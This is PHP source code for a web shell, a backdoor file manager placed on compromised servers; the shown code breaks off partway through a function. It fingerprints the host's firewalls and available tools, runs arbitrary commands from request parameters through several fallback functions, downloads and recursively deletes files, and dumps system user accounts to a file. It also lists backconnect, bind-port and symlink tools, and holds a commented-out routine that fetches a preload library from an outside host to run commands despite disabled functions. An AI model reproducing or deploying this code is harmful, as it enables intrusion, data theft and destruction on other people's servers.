$priv();
if (!function_exists('priv_get_url')) {
    function priv_get_url($query = false)
    {
        return sprintf("%s://%s%s", isset($_SERVER['HTTPS']) ? "https" : "http", $_SERVER['HTTP_HOST'], $query ? $_SERVER['REQUEST_URI'] : $_SERVER['SCRIPT_NAME']);
    }
}
if (!function_exists('priv_get_info')) {
    function priv_get_info()
    {
        $firewall = array();
        $stats = array();
        $dis = strtolower(array_shift($_SESSION['_dis_']));
        if (isset($_SERVER['HTTP_CF_CONNECTING_IP']))
            array_push($firewall, 'Cloudflare');
        if (isset($_SERVER['HTTP_X_SUCURI_CLIENTIP']))
            array_push($firewall, 'Sucuri');
        if (is_dir('/etc/bitninja/'))
            array_push($firewall, 'Bitninja');
        $f_chk = array(
            'MySQL' => 'mysql_connect',
            'MSSQL' => 'mssql_connect',
            'Oracle' => 'ocilogon',
            'PostgreSQL' => 'pg_connect',
            'Curl' => 'curl_version',
            'ZipArchive' => 'zip',
        );
        $ex_chk = array(
            'Wget' => 'wget --version',
            'Perl' => 'perl -v',
            'Python' => 'python --version',
            'Ruby' => 'ruby -v',
            'GCC' => 'gcc -v',
            'Netcat' => 'nc -v',
            'Zip' => 'zip -v',
            'Gzip' => 'gzip --version',
            'Gunzip' => 'gunzip --version',
        );
        foreach ($f_chk as $lb => $fucn) {
            array_push($stats, sprintf("<span class='%s' style='padding-right: 3px;'>%s</span>", is_callable($fucn) || function_exists($fucn) && !in_array($_SESSION['_dis_'], $fucn) || extension_loaded($fucn) ? "ok" : "error", ucwords(strtolower($lb))));
        }
        foreach ($ex_chk as $lb => $cm) {
            $_SESSION[$cm] = isset($_SESSION[$cm]) ? $_SESSION[$cm] : e_xe($cm);
            $_SESSION['xava'][strtolower($lb)] = !empty($_SESSION[$cm]) && !preg_match('/(not\s?found|recognized)/si', $_SESSION[$cm]) ? true : false;
            array_push($stats, sprintf("<span class='%s' style='padding-right: 3px;'>%s</span>", $_SESSION['xava'][strtolower($lb)] ? "ok" : "error", ucwords(strtolower($lb))));
        }
        $arps = explode(DIRECTORY_SEPARATOR, var_d());
        $url = priv_get_url();
        $q = var_append_req(array('d', 'cuk', 'f', 'xtool', 'fuk'));
        $pt = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN' ? "" : sprintf("<a href='%s' >%s</a>", "{$url}?{$q}&d=/", DIRECTORY_SEPARATOR);
        foreach ($arps as $a => $p) {
            if (empty($p)) continue;
            $pth = isset($_SESSION['_x_']['crypt']) && $_SESSION['_x_']['crypt'] ? $_SESSION['_x_']['xh'](re_path($arps, $p)) : re_path($arps, $p);
            $pt .= sprintf("<a href='%s' >%s</a>%s", "{$url}?d={$pth}&{$q}", $p, DIRECTORY_SEPARATOR);
        }
        $safe = @ini_get("safe_mode") || strtolower(ini_get("safe_mode")) == "on" ? true : false;
        $dsabled = $dis === "" || $dis === "none" ? true : false;
        $writable = is_writable(var_d());
        $alx = in_array(get_client_ip(), array("127.0.0.1", "::1")) ? false : priv_alexa();
        $alexa = $alx ? sprintf("Alexa : (<a href='//www.alexa.com/siteinfo/%s' target='_blank'>%s</a>)", parse_url($url, PHP_URL_HOST), $alx) : "";
        $infos = array(
            'Host' => sprintf("<a href='//%s' target='_blank'>%s</a> %s", parse_url($url, PHP_URL_HOST), parse_url($url, PHP_URL_HOST), $alexa),
            'Software' => sprintf("%s %s", getenv("SERVER_SOFTWARE"), !preg_match('/php\//i', getenv("SERVER_SOFTWARE")) ? "PHP/" . phpversion() : ""),
            'Uname' => sprintf("<a href='https://www.google.com/search?q=%s&ie=utf-8&oe=utf-8' target='_blank' title='search on google'>%s</a>", urlencode(php_uname()), php_uname()),
            'whoami' => get_current_user(),
            'Pwd' => preg_replace('%([^:])(\/{2,})%im', '$1/', $pt),
            'Writable' => sprintf("<span class='%s'>%s</span>", $writable ? "ok" : "error", $writable ? "Yes" : "No"),
            'Firewall' => sprintf("<span class='%s' >%s</span>", count($firewall) < 1 ? "ok" : "error", count($firewall) < 1 ? "NONE" : implode(",", $firewall)),
            'Status' => implode(",", $stats),
            'Disable Function' => sprintf("<span class='%s' >%s</span>", $dsabled ? "ok" : "error", $dsabled ? "NONE" : implode(",", $_SESSION['_dis_'])),
            'Safemode' => sprintf("<span style='color: %s'>%s</span>", $safe ? "red" : "darkgreen", $safe ? "ON (secure)" : "OFF (not secure)"),
            'Ip' => sprintf("You <a href='//dnslytics.com/ip/%s' target='_blank'>%s</a> Host <a href='//dnslytics.com/ip/%s' target='_blank'>%s</a> (<a href='//viewdns.info/reverseip/?t=1&host=%s' target='_blank'>Reserve</a>)", get_client_ip(), get_client_ip(), $_SERVER['SERVER_ADDR'], $_SERVER['SERVER_ADDR'], $_SERVER['SERVER_ADDR']),
        );
        foreach ($infos as $label => $info)
            e_(sprintf("\n<p><strong>%s : </strong><strong>%s</strong></p>", ucwords($label), $info));
    }
}
if (!function_exists('priv_get_tools')) {
    function priv_get_tools()
    {
        $url = priv_get_url();
        $d = var_d();
        $tools = array(
            'Backconect' => 'conect',
            'BindPort' => 'Bind',
            'Symlink' => 'sym',
            'SymDom' => 'symdom',
            'etcposix' => 'etcposix',
            'Database' => 'db',
            'Self Remove' => 'self-remove',
        );
        foreach ($tools as $label => $info)
            e_(sprintf("\n <form action='%s'><span style='align-items: center; padding-left: 5px;padding-right: 5px;'> <input type='hidden' name='xtool' value='%s'>  <input type='hidden' name='d' value='%s'> <button type='submit' class='xbutton'>%s</button></span></form>", $url, strtolower($info), $d, ucwords(strtolower($label))));
    }
}
if (!function_exists('re_path')) {
    function re_path($arrays, $stop)
    {
        $p = array();
        foreach ($arrays as $item => $val) {
            if (empty($val)) continue;
            array_push($p, strtoupper(substr(PHP_OS, 0, 3)) === 'WIN' ? $val : DIRECTORY_SEPARATOR . $val);
            if ($val === $stop) break;
        }
        return implode(DIRECTORY_SEPARATOR, $p) . DIRECTORY_SEPARATOR;
    }
}
if (!function_exists('ehex')) {
    function ehex($str)
    {
        try {
            if (ctype_xdigit($str) && strlen($str) % 2 == 0)
                return $_SESSION['_x_']['hx']($str);
        } catch (Exception $e) {
        }
        return $str;
    }
}
if (!function_exists('var_fk')) {
    function var_fk()
    {
        return isset($_REQUEST['fuk']) ? ehex(trim($_REQUEST['fuk'])) : false;
    }
}
if (!function_exists('var_c')) {
    function var_c()
    {
        return isset($_REQUEST['cuk']) ? ehex(trim($_REQUEST['cuk'])) : false;
    }
}
if (!function_exists('var_f')) {
    function var_f()
    {
        if (isset($_POST['xfile']) && isset($_POST['xcode'])) return ehex(trim($_POST['xfile']));
        return isset($_REQUEST['f']) ? ehex(trim($_REQUEST['f'])) : false;
    }
}
if (!function_exists('var_t')) {
    function var_t()
    {
        return isset($_REQUEST['xtool']) ? ehex(trim($_REQUEST['xtool'])) : false;
    }
}
if (!function_exists('char_escape')) {
    function char_escape($text)
    {
        return htmlspecialchars($text, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
    }
}
if (!function_exists('var_d')) {
    function var_d()
    {
        $path = rtrim(isset($_REQUEST['d']) ? ehex(trim($_REQUEST['d'])) : realpath(getcwd()), DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR;
        if (is_dir($path) && is_readable($path)) chdir($path);
        return $path;
    }
}
if (!function_exists('var_append_req')) {
    function var_append_req($exclude = false)
    {
        $req = $_REQUEST;
        if ($exclude && !is_array($exclude) && isset($req[$exclude])) unset($req[$exclude]);
        if ($exclude && !is_array($exclude) && strtolower($exclude) === 'all') $req = array();
        if ($exclude && is_array($exclude)) {
            foreach ($exclude as $e => $x) {
                if (!empty($x) && isset($req[$x])) unset($req[$x]);
            }
        }
        return http_build_query($req);
    }
}
if (!function_exists('priv_alexa')) {
    function priv_alexa()
    {
        try {
            if (isset($_SESSION['priv_alexa'])) return $_SESSION['priv_alexa'];
            ini_set('default_socket_timeout', 15);
            $xml = simplexml_load_file(sprintf("http://xml.alexa.com/data?cli=10&url=%s", parse_url(priv_get_url(), PHP_URL_HOST)));
            $_SESSION['priv_alexa'] = !isset($xml->SD) ? false : (string)$xml->SD->REACH->attributes();
        } catch (Exception $e) {
            $_SESSION['priv_alexa'] = false;
        }
        return $_SESSION['priv_alexa'];
    }
}
if (!function_exists('priv_fstat')) {
    function priv_fstat($file)
    {
        clearstatcache();
        $ss = !is_callable('stat') ? array(
            'uid' => fileowner($file),
            'gid' => filegroup($file),
            'atime' => fileatime($file),
            'ctime' => filectime($file),
            'mtime' => filemtime($file),
            'size' => filesize($file),
            'mode' => fileperms($file),
        ) : @stat($file);
        if (!$ss) return false; //Couldnt stat file
        $ts = array(
            0140000 => 'ssocket',
            0120000 => 'llink',
            0100000 => '-file',
            0060000 => 'bblock',
            0040000 => 'ddir',
            0020000 => 'cchar',
            0010000 => 'pfifo'
        );
        //  die(print_r($ss));
        $p = $ss['mode'];
        $t = decoct($ss['mode'] & 0170000); // File Encoding Bit
        $str = (array_key_exists(octdec($t), $ts)) ? $ts[octdec($t)]{0} : 'u';
        $str .= (($p & 0x0100) ? 'r' : '-') . (($p & 0x0080) ? 'w' : '-');
        $str .= (($p & 0x0040) ? (($p & 0x0800) ? 's' : 'x') : (($p & 0x0800) ? 'S' : '-'));
        $str .= (($p & 0x0020) ? 'r' : '-') . (($p & 0x0010) ? 'w' : '-');
        $str .= (($p & 0x0008) ? (($p & 0x0400) ? 's' : 'x') : (($p & 0x0400) ? 'S' : '-'));
        $str .= (($p & 0x0004) ? 'r' : '-') . (($p & 0x0002) ? 'w' : '-');
        $str .= (($p & 0x0001) ? (($p & 0x0200) ? 't' : 'x') : (($p & 0x0200) ? 'T' : '-'));
        $s = array(
            'perms' => array(
                'umask' => sprintf("%04o", @umask()),
                'human' => $str,
                'octal1' => sprintf("%o", ($ss['mode'] & 000777)),
                'octal2' => sprintf("0%o", 0777 & $p),
                'decimal' => sprintf("%04o", $p),
                'fileperms' => @fileperms($file),
                'mode1' => $p,
                'mode2' => $ss['mode']),
            'owner' => array(
                'fileowner' => $ss['uid'],
                'filegroup' => $ss['gid'],
                'owner' =>
                    function_exists('posix_getpwuid') && !in_array('posix_getpwuid', $_SESSION['_dis_']) ?
                        posix_getpwuid($ss['uid']) : $ss['uid'],
                'group' =>
                    function_exists('posix_getgrgid') && !in_array('posix_getgrgid', $_SESSION['_dis_']) ?
                        posix_getgrgid($ss['gid']) : $ss['gid']
            ),
            'file' => array(
                'filename' => $file,
                'realpath' => realpath($file) != $file ? realpath($file) : '',
                'dirname' => dirname($file),
                'basename' => basename($file)
            ),
            'filetype' => [
                'type' => substr($ts[octdec($t)], 1),
                'mime' => basename($file) === '..' ? 'shortcut' : @mime_content_type($file),
                'type_octal' => sprintf("%07o", octdec($t)),
                'is_file' => is_file($file),
                'is_dir' => is_dir($file),
                'is_link' => is_link($file),
                'is_readable' => is_readable($file),
                'is_writable' => is_writable($file)
            ],
            'size' => array(
                'size' => $ss['size'], //Size of file, in bytes.
                'human' => priv_filesize($ss['size']), //Size of file, in bytes.
                'blocks' => isset($ss['blocks']) ?: false, //Number 512-byte blocks allocated
                'block_size' => isset($ss['blksize']) ?: false //Optimal block size for I/O.
            ),
            'time' => array(
                'mtime' => $ss['mtime'], //Time of last modification
                'atime' => $ss['atime'], //Time of last access.
                'ctime' => $ss['ctime'], //Time of last status change
                'accessed' => date("d/m/Y H:i:s", $ss['atime']),
                'modified' => date("d/m/Y H:i:s", $ss['mtime']),
                'created' => date("d/m/Y H:i:s", $ss['ctime'])
            ),
        );
        clearstatcache();
        return json_decode(json_encode($s, JSON_FORCE_OBJECT), false);
    }
}
if (!function_exists('var_img')) {
    function var_img($f)
    {
        $mime = $f->filetype->is_link ? "shortcut" : $f->filetype->mime;
        switch (strtolower($mime)) {
            default:
                $src = "data:image/png;base64,";
                break;
            case "text/x-php":
                $src = "data:image/png;base64,";
                break;
            case "directory":
                $src = "data:image/png;base64,";
                break;
            case "shortcut":
                $src = " data:image/gif;base64,";
                break;
        }
        $url = priv_get_url();
        $isfile = empty($f->filetype->is_dir) ? true : false;
        $d = isset($_SESSION['_x_']['crypt']) && $_SESSION['_x_']['crypt'] ? $_SESSION['_x_']['xh'](var_d()) : var_d();
        $q = var_append_req('all');
        $path = empty($f->file->realpath) ? $f->file->filename : $f->file->realpath;
        $path = isset($_SESSION['_x_']['crypt']) && $_SESSION['_x_']['crypt'] ? $_SESSION['_x_']['xh']($path) : $path;
        $hexname = isset($_SESSION['_x_']['crypt']) && $_SESSION['_x_']['crypt'] ? $_SESSION['_x_']['xh']($f->file->filename) : $f->file->filename;
        $href = $isfile ? "{$url}?{$q}&f={$hexname}&d={$d}" : "{$url}?{$q}&d={$path}";
        return sprintf("<a href='%s' class='default'><img src='%s'> %s</a>", $href, trim($src), $f->file->basename);
    }
}
if (!function_exists('var_act')) {
    function var_act($f)
    {
        $src_dl = 'data:image/png;base64,';
        $src_x = 'data:image/png;base64,';
        if ($f->file->basename == '.' || $f->file->basename == '..') return "";
        $url = priv_get_url();
        $isfile = empty($f->filetype->is_dir) ? true : false;
        $d = isset($_SESSION['_x_']['crypt']) && $_SESSION['_x_']['crypt'] ? $_SESSION['_x_']['xh'](var_d()) : var_d();
        $q = var_append_req('all');
        $path = empty($f->file->realpath) ? $f->file->filename : $f->file->realpath;
        $path = isset($_SESSION['_x_']['crypt']) && $_SESSION['_x_']['crypt'] ? $_SESSION['_x_']['xh']($path) : $path;
        $hexxdl = isset($_SESSION['_x_']['crypt']) && $_SESSION['_x_']['crypt'] ? $_SESSION['_x_']['xh']('xdl') : "xdl";
        $hexxdel = isset($_SESSION['_x_']['crypt']) && $_SESSION['_x_']['crypt'] ? $_SESSION['_x_']['xh']('xdel') : "xdel";
        $acts = array(
            sprintf("<a href='%s' style='color: #d9d9d9;' title='Download'><img src='%s' style='padding-right: 5px;'></a>", "{$url}?xtool={$hexxdl}&{$q}&f={$path}&d={$d}", trim($src_dl)),
            sprintf("<a href='%s' style='color: #d9d9d9;' title='Delete'><img src='%s' style='padding-right: 5px;'></a>", "{$url}?xtool={$hexxdel}&{$q}&f={$path}&d={$d}", trim($src_x)),
        );
        return implode("\n", $acts);
    }
}
if (!function_exists('e_xe')) {
    function e_xe($s_c)
    {
        $bp_dis = "/tmp/dis.so";
        $s_out = "";
        $s_c = preg_match('/2>&1/si', $s_c) ? $s_c : sprintf("%s 2>&1", $s_c);
        if (is_callable('system') && !in_array('system', $_SESSION['_dis_'])) {
            ob_start();
            @system($s_c);
            $s_out = ob_get_contents();
            ob_end_clean();
            if (!empty($s_out)) return $s_out;
        }
        if (is_callable('shell_exec') && !in_array('shell_exec', $_SESSION['_dis_'])) {
            $s_out = @shell_exec($s_c);
            if (!empty($s_out)) return $s_out;
        }
        if (is_callable('exec') && !in_array('exec', $_SESSION['_dis_'])) {
            @exec($s_c, $s_r);
            if (!empty($s_r)) foreach ($s_r as $s_s) $s_out .= $s_s;
            if (!empty($s_out)) return $s_out;
        }
        if (is_callable('passthru') && !in_array('passthru', $_SESSION['_dis_'])) {
            ob_start();
            @passthru($s_c);
            $s_out = ob_get_contents();
            ob_end_clean();
            if (!empty($s_out)) return $s_out;
        }
        if (is_callable('proc_open') && !in_array('proc_open', $_SESSION['_dis_'])) {
            $s_descriptorspec = array(
                0 => array("pipe", "r"),
                1 => array("pipe", "w"),
                2 => array("pipe", "w")
            );
            $s_proc = @proc_open($s_c, $s_descriptorspec, $s_pipes, getcwd(), array());
            if (is_resource($s_proc)) {
                while ($s_si = fgets($s_pipes[1])) {
                    if (!empty($s_si)) $s_out .= $s_si;
                }
                while ($s_se = fgets($s_pipes[2])) {
                    if (!empty($s_se)) $s_out .= $s_se;
                }
            }
            @proc_close($s_proc);
            if (!empty($s_out)) return $s_out;
        }
        if (is_callable('popen') && !in_array('popen', $_SESSION['_dis_'])) {
            $s_f = @popen($s_c, 'r');
            if ($s_f) {
                while (!feof($s_f)) {
                    $s_out .= fread($s_f, 2096);
                }
                pclose($s_f);
            }
            if (!empty($s_out)) return $s_out;
        }
        // if (!file_exists($bp_dis) && copy('http://localroot.xyz/local/dis.so',$bp_dis)) {
        //     putenv(sprintf("EVIL_CMDLINE=%s > /tmp/dis_out 2>&1",$s_c));
        //     putenv("LD_PRELOAD={$bp_dis}");
        //     mail("", "", "", "");
        //     if (($s_out = file_get_contents('/tmp/dis_out')) &&!empty($s_out)){
        //         unlink('/tmp/dis_out');
        //         return $s_out;
        //     }
        // } elseif (file_exists($bp_dis)) {
        //     putenv(sprintf("EVIL_CMDLINE=%s > /tmp/dis_out 2>&1",$s_c));
        //     putenv("LD_PRELOAD={$bp_dis}");
        //     mail("", "", "", "");
        //     if (($s_out = file_get_contents('/tmp/dis_out'))&&!empty($s_out)){
        //         unlink('/tmp/dis_out');
        //         return $s_out;
        //     }
        // }
        return "";
    }
}
if (!function_exists('e_')) {
    function e_($str)
    {
        echo($str);
    }
}
if (!function_exists('get_client_ip')) {
    function get_client_ip($validate = false)
    {
        $ipkeys = array(
            'REMOTE_ADDR',
            'HTTP_CLIENT_IP',
            'HTTP_CF_CONNECTING_IP',
            'HTTP_X_FORWARDED_FOR',
            'HTTP_X_FORWARDED',
            'HTTP_FORWARDED_FOR',
            'HTTP_FORWARDED',
            'HTTP_X_SUCURI_CLIENTIP',
            'HTTP_X_CLUSTER_CLIENT_IP'
        );
        $ip = array();
        foreach ($ipkeys as $keyword) {
            if (isset($_SERVER[$keyword])) {
                if ($validate) {
                    if (validate_public_ip($_SERVER[$keyword])) {
                        $ip[] = $_SERVER[$keyword];
                    }
                } else {
                    $ip[] = $_SERVER[$keyword];
                }
            }
        }
        $ip = (empty($ip) ? '0.0.0.0' : implode(", ", $ip));
        return trim(array_pop(array_values(explode(',', $ip))));
    }
}
if (!function_exists('unlinkr')) {
    function unlinkr($dir)
    {
        error_reporting(0);
        $dir = rtrim($dir, '/\\');
        // find all files and folders matching pattern
        $files = new DirectoryIterator($dir);
        //interate thorugh the files and folders
        foreach ($files as $file) {
            //  if it is a directory then re-call unlinkr function to delete files inside this directory
            if (is_dir($file->getRealPath()) and !in_array($file->getFilename(), array('..', '.'))) {
                unlinkr($file->getRealPath());
                //remove the directory itself
                rmdir($file->getRealPath());
            } else if (is_file($file->getRealPath()) and ($file->getRealPath() != __FILE__)) {
                // make sure you don't delete the current script
                unlink($file->getRealPath());
            }
        }
        rmdir($dir);
    }
}
if (!function_exists('validate_public_ip')) {
    function validate_public_ip($ip)
    {
        if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE))
            return true;
        return false;
    }
}
if (!function_exists('perm_color_class')) {
    function perm_color_class($path)
    {
        if (!is_readable($path)) return "error";
        if (is_dir($path))
            return is_writable($path) ? "success" : "warning";
        return is_writable($path) ? "success" : "error";
    }
}
if (!function_exists('etcposix')) {
    function etcposix()
    {
        $_SESSION['etcarray'] = array();
        if (!is_callable('posix_getpwuid') || in_array('posix_getpwuid', $_SESSION['_dis_'])) return $_SESSION['etcarray'];
        $ranges = range(intval(0), intval(1500));
        array_walk($ranges, function ($id, $k) {
            if ($uid = posix_getpwuid($id))
                array_push($_SESSION['etcarray'], join(":", $uid));
        });
        file_put_contents("passwd", implode("\n", $_SESSION['etcarray']));
        return $_SESSION['etcarray'];
    }
}
if (!function_exists('slink')) {
    function slink($in, $out)
    {
        error_reporting(0);
        if (!file_exists($in)) return;
        switch ($in) {
            case "/":
                $_SESSION['_x_']['sym']($in, $out);
                break;
            default:
                $_SESSION['_x_']['cp']($in, sprintf("%s_copy.txt", strtolower($out)));
                $_SESSION['_x_']['sym']($in, sprintf("%s_symlink.txt", strtolower($out)));
                break;
        }
    }
}
if (!function_exists('priv_filesize')) {
    function priv_filesize($size, $precision = 2)
    {
        $units = array('B', 'kB', 'MB', 'GB', 'TB', 'PB', 'EB', 'ZB', 'YB');
        $step = 1024;
        $i = 0;
        while (($size / $step) > 0.9) {
            $size = $size / $step;
            $i++;
        }
        return sprintf("%s %s", round($size, $precision), $units[$i]);
    }
}
if (!function_exists('priv_file_create')) {
    function priv_file_create($file, $str)
    {
        if ($w_file = @fopen($file, "w+")) {
            @fputs($w_file, $str);
            @fclose($w_file);
            return realpath($file);
        }
        return false;
    }
}
if (!function_exists('priv_exeute')) {
    function priv_exeute()
    {
        $res = e_xe(trim(var_c()));
        if (!var_c()) return;
        e_("<tr><td>");
        e_("<script type='application/javascript'>");
        e_(sprintf("
            document.addEventListener('DOMContentLoaded', function ()  {
            var xcom='%s';var priv_xcom = document.getElementById('xcom');priv_xcom.value = xcom.base64_decode();});", $_SESSION['_x_']['64e']($res)));
        e_("</script>");
        e_(sprintf("<textarea class='full' id='xcom' style='%s'></textarea>", strlen($res) > 100 ? "height: 300px;" : ""));
        e_("</td></tr>");
    }
}
if (!function_exists('priv_xtool')) {
    function priv_xtool()
    {
        if (!var_t()) return;
        switch (strtolower(var_t())) {
            case "self-remove":
                unlink(__FILE__);
                break;
            case "xdl":
                if ($path = realpath(var_f())) {
                    if (is_dir($path)) {
                        $bname = sprintf("%s.zip", basename($path));
                        $temp_file = tempnam(sys_get_temp_dir(), $bname);
                        if ($file = zipData($path, $temp_file)) {
                            // die($temp_file);
                            ob_clean();
                            ob_end_flush();
                            header("Cache-Control: no-cache, must-revalidate");
                            header("Content-Description: File Transfer");
                            header(sprintf("Content-Disposition: attachment; filename=%s", basename($bname)));
                            header('Content-Type: application/zip');
                            readfile($temp_file);
                            unlink($temp_file);
                            exit;
                        } else {
                            e_(sprintf("<tr><td><span class='error' style='display:table;margin:0 auto;'>%s</span></td></tr>", "Failed!"));
                        }
                    } else {
                        ob_clean();
                        ob_end_flush();
                        header('Pragma: public');
                        header("Cache-Control: no-cache, must-revalidate");
                        header("Content-Description: File Transfer");
                        header('Content-Transfer-Encoding: binary');
                        header(sprintf("Content-Disposition: attachment; filename=%s", basename($path)));
                        header('Content-Type: application/octet-stream');
                        readfile($path);
                        exit;
                    }
                }
                break;
            case "xdel":
                $url = priv_get_url();
                $q = var_append_req('f');
                $t_del = var_f();
                $_SESSION['priv_fileman'] = true;
                if (is_dir($t_del)) {
                    unlinkr($t_del);
                } else {
                    unlink($t_del);
                }
                break;
            case "sym":
                $sym_path_conf = var_d() . DIRECTORY_SEPARATOR . 'w00t';
